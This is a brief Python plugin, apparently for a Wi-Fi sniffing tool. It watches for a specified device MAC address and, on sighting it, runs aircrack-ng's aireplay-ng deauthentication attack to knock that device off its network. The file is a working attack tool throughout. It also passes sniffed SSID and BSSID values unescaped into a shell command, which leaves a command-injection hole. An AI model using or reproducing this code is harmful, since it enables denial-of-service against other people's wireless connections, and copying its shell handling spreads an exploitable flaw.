"""Looks for and deauths the specified mac_to_deauth using aircrack-ng."""
import time
import subprocess

__apiversion__ = 1
__config__ = {'trigger_cooldown': 1, 'log_level': 'ERROR'}


class Trigger:
    # TODO: Plugin configurable
    # TODO: Deauth by vendor
    def __init__(self, mac_to_deauth='3c:2e:ff:33:44:55', deauth_count=3):
        self.mac_to_deauth = mac_to_deauth
        self.deauth_count = deauth_count

    def __call__(self, dev_id=None, ssid=None, bssid=None, iface=None, **kwargs):
        if dev_id == self.mac_to_deauth:
            print('Saw MAC ({}) on bssid={}, ssid={}, iface={}'.format(dev_id, bssid, ssid, iface))
            if iface:
                if bssid and bssid.lower() not in {'00:00:00:00:00:00', 'ff:ff:ff:ff:ff:ff'}:
                    print('\tDeauthing {}'.format(dev_id))
                    deauth_cmd = 'aireplay-ng -0 {count} -a {bssid} -c {mac} {iface}'.format(count=self.deauth_count,
                                                                                             bssid=bssid,
                                                                                             iface=iface,
                                                                                             mac=dev_id)
                    print('\tDeauth cmd: {}'.format(deauth_cmd))
                    subprocess.call(deauth_cmd, shell=True)
                    return
                elif ssid:
                    print('\tDeauthing {}'.format(dev_id))
                    deauth_cmd = 'aireplay-ng -0 {count} -e {ssid} -c {mac} {iface}'.format(count=self.deauth_count,
                                                                                            ssid=ssid,
                                                                                            iface=iface,
                                                                                            mac=dev_id)
                    print('\tDeauth cmd: {}'.format(deauth_cmd))
                    subprocess.call(deauth_cmd, shell=True)
                    return

            print('\tNot enough data to deauth - need ssid or bssid')
